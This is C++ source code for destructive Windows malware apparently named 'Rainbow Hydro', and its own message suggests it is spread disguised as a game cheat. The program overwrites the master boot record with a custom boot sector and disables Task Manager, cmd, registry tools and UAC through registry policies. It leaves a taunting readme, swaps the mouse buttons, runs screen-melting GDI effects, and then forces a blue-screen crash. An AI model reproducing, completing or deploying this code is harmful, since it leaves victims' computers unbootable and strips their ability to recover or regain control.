#include <windows.h>
#include <winreg.h>
#include <stdlib.h>
#include <mmeapi.h>
#include <iostream>
#include <fstream>
#include "SoundGDI32.h"
#include "UtilsGDI32.h"
#pragma comment(lib, "ntdll.lib")
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);
using namespace std;
unsigned char bootsector[] = { 0xBB, 0x00, 0xA0, 0x8E, 0xC3, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0x89, 0xF0, 0x7D, 0x02, 0xFE, 0xC0,
0xAA, 0x4A, 0x75, 0xF6, 0x46, 0x75, 0xF5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

int _stdcall WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
	// Overwrite the master boot record:
	DWORD BytesWritten;
	HANDLE PhysicalDrv = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	WriteFile(PhysicalDrv, bootsector, 512, &BytesWritten, NULL);
	CloseHandle(PhysicalDrv);
	std::cout << "Successfully killed the mbr" << std::endl;
	// Disable task manager and cmd.exe:
	HKEY execute;
	INT32 enable = 1;
	RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL,
		REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &execute, NULL);
	RegSetValueExW(execute, L"DisableCMD", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&enable), sizeof(enable));
	RegSetValueExW(execute, L"DisableTaskMgr", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&enable), sizeof(enable));
	RegSetValueExW(execute, L"DisableRegistryTools", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&enable), sizeof(enable));
	RegSetValueExW(execute, L"DisableLockWorkstation", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&enable), sizeof(enable));
	RegCloseKey(execute);
	std::cout << "Successfully disabled files" << std::endl;
	// Disable admin permission and LUA:
	HKEY admin;
	INT32 disable = 0;
	RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL,
		REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &admin, NULL);
	RegSetValueExW(admin, L"EnableLUA", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&disable), sizeof(disable));
	RegSetValueExW(admin, L"EnableVirtualization", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&disable), sizeof(disable));
	RegSetValueExW(admin, L"ConsentPromptBehaviorUser", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&disable), sizeof(disable));
	RegSetValueExW(admin, L"ConsentPromptBehaviorAdmin", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&disable), sizeof(disable));
	RegCloseKey(admin);
	std::cout << "Successfully disabled admin" << std::endl;
	// Write a text file that gets read:
	std::ofstream message("readme.txt");
	message << "Rainbow Hydro has trashed your computer" << std::endl;
	message << "May your C drive rest in piss" << std::endl;
	message << "" << std::endl;
	message << "If you think this is a roblox/minecraft" << std::endl;
	message << "or any game script, You're an idiot and" << std::endl;
	message << "You shouldn't download cheats, If there" << std::endl;
	message << "are no warnings, You are running the no" << std::endl;
	message << "warnings version" << std::endl;
	message.close();
	// Read the written message(readme):
	WCHAR commandprompt[] = L"notepad.exe readme.txt";
	PROCESS_INFORMATION process = { 0 };
	STARTUPINFO startinfo = { 0 };
	CreateProcessW(NULL, commandprompt, NULL, NULL, FALSE, CREATE_UNICODE_ENVIRONMENT, NULL, NULL,
		&startinfo, &process);
	CloseHandle(process.hThread);
	CloseHandle(process.hProcess);
	SwapMouseButton(1);
	Sleep(2000);
	// Draw an icon on the mouse cursor:
	HANDLE icon = CreateThread(0, 0, CursorGDI, 0, 0, 0);
	// Load the 1st gdi effect(melting):
	HANDLE melteffect = CreateThread(0, 0, MeltGDI, 0, 0, 0);
	MeltSound();
	Sleep(20000);
	TerminateThread(melteffect, 0);
	CloseHandle(melteffect);
	InvalidateRect(0, 0, 0);
	// Load the 2nd gdi effect(gdihell):
	HANDLE rainbow = CreateThread(0, 0, ColorHellGDI, 0, 0, 0);
	ColorHellSound();
	Sleep(20000);
	TerminateThread(rainbow, 0);
	CloseHandle(rainbow);
	InvalidateRect(0, 0, 0);
	// Load the	3rd gdi effect(rgbhell):
	HANDLE rgb = CreateThread(0, 0, RainbowGDI, 0, 0, 0);
	RainbowSound();
	Sleep(30000);
	TerminateThread(rgb, 0);
	CloseHandle(rgb);
	InvalidateRect(0, 0, 0);
	// Load the 4th gdi effect(rainbow):
	HANDLE flash = CreateThread(0, 0, FlashGDI, 0, 0, 0);
	FlashSound();
	Sleep(15000);
	InvalidateRect(0, 0, 0);
	// Trigger blue killscreen of death:
	BOOLEAN Temp32;
	UINT32 ErrorResponse = 0;
	ULONG Response;
	RtlAdjustPrivilege(19, true, false, &Temp32);
	NtRaiseHardError(0xc0000022, 0, 0, 0, 6, &Response);
	std::cout << "Rest in pepperonis" << std::endl;
}